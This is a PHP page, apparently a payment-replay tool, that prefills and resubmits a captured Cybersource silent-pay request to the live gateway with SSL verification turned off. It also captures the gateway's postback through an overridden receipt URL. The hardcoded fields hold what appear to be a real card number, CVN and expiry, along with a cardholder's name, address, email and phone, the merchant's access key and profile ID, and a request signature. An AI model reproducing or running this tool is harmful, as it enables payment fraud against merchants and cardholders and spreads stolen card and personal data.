<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['__act_as_receipt__'])) {
    echo "<h2>📩 Captured POST from Cybersource to override_custom_receipt_page</h2>";
    echo "<pre>" . print_r($_POST, true) . "</pre>";
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['__replay_silent_pay__'])) {
    unset($_POST['__replay_silent_pay__']);

    echo "<h2>🚀 Replaying Silent Order POST to Cybersource</h2>";

    $ch = curl_init('https://secureacceptance.cybersource.com/silent/pay');
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($_POST));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    echo "<h3>✅ Sent. Cybersource responded with HTTP status: $httpcode</h3>";
    echo "<div style='border:1px solid #ccc;padding:10px;background:#f9f9f9;'>" . htmlspecialchars($response) . "</div>";
    exit;
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Cybersource Replay + Capture</title>
</head>
<body>
<h2>🔁 Reuse and Replay Cybersource Silent Pay Request</h2>
<form method="POST">
  <input type="hidden" name="__replay_silent_pay__" value="1">
  <?php
  $fields = [
    'CardNo4' => '4246 3153 8031 1140',
    'access_key' => '972ae9ba01f73c56999e33ba51d7e261',
    'amount' => '672.75',
    'auth_trans_ref_no' => 'KBLFQCU',
    'bill_ref' => 'X8VJM3',
    'bill_to_address_city' => 'Wilmington',
    'bill_to_address_country' => 'US',
    'bill_to_address_line1' => '433 Darlington Ave U',
    'bill_to_address_line2' => '+254756754595',
    'bill_to_address_postal_code' => '28403',
    'bill_to_address_state' => 'NC',
    'bill_to_email' => 'bombardier.devs.master@gmail.com',
    'bill_to_forename' => 'Brent',
    'bill_to_phone' => '+254756754595',
    'bill_to_surname' => 'Seaver',
    'card_cvn' => '700',
    'card_expiry_date' => '09-2028',
    'card_number' => '4246315380311140',
    'card_type' => '001',
    'currency' => 'KES',
    'customer_ip_address' => '172.18.162.51',
    'device_fingerprint_id' => 'vskul9h7p58opoknpdqmrj42k7',
    'eMonth' => '09',
    'eYear' => '2028',
    'first_name' => 'Brent',
    'item_0_code' => 'KBLFQCU',
    'item_0_name' => 'KBLFQCU',
    'item_0_quantity' => '1',
    'item_0_sku' => 'KBLFQCU',
    'item_0_unit_price' => '672.75',
    'last_name' => 'Seaver',
    'line_item_count' => '1',
    'locale' => 'en-us',
    'merchant_defined_data1' => 'MDD#1',
    'merchant_defined_data2' => 'MDD#2',
    'merchant_defined_data3' => 'MDD#3',
    'merchant_defined_data4' => 'http://localhost/override_custom_receipt_page.php',
    'merchant_descriptor' => 'ECITIZEN',
    'name' => 'Brent Seaver',
    'override_custom_receipt_page' => 'http://localhost/override_custom_receipt_page.php',
    'payment_gateway_id' => '30',
    'payment_method' => 'card',
    'profile_id' => 'AE3F228E-9750-4C9E-96A8-709E36BB502B',
    'reference_number' => 'KBLFQCU',
    'service_id' => '42',
    'signature' => 'DHGiKk5Vq8dbV+gxtN3J402A4Rp26xUq5mVoZ3BUyuI=',
    'signed_date_time' => '2025-05-15T03:10:00Z',
    'signed_field_names' => 'profile_id,access_key,transaction_uuid,signed_field_names,unsigned_field_names,signed_date_time,locale,payment_method,transaction_type,reference_number,auth_trans_ref_no,amount,currency,merchant_descriptor,override_custom_receipt_page',
    'transaction_type' => 'sale',
    'transaction_uuid' => 'X8VJM3_510',
    'unsigned_field_names' => 'device_fingerprint_id,card_type,card_number,card_expiry_date,card_cvn,bill_to_forename,bill_to_surname,bill_to_email,bill_to_phone,bill_to_address_line1,bill_to_address_line2,bill_to_address_city,bill_to_address_state,bill_to_address_country,bill_to_address_postal_code,customer_ip_address,line_item_count,item_0_code,item_0_sku,item_0_name,item_0_quantity,item_0_unit_price,merchant_defined_data1,merchant_defined_data2,merchant_defined_data3,merchant_defined_data4'
  ];

  foreach ($fields as $key => $value) {
    echo "<label>$key</label><br><input type='text' name='$key' value='" . htmlspecialchars($value) . "'><br><br>";
  }
  ?>
  <button type="submit">🔁 Replay POST to Cybersource</button>
</form>

<hr>
<h2>🛡️ Cybersource override_custom_receipt_page Endpoint Capture</h2>
<form method="POST">
  <input type="hidden" name="__act_as_receipt__" value="1">
  <button type="submit">🔍 Simulate Cybersource POST back to this page</button>
</form>
</body>
</html>
